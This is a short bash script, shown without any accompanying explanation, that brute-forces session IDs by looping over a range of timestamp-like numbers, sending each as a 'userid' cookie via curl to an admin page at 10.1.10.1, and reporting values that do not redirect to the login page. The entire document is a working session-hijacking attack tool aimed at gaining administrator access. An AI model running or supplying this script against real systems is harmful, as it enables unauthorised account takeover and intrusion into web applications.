#!/bin/bash
start=1267604160
end=1267605960
for (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i
http://10.1.10.1/admin/index.asp | grep -c login.asp` -lt
"1" ] then echo "Session ID Found:  $i"
fi
if [ $(($i % 100)) -eq "0" ]
then echo "Currently at $i"
fi
done

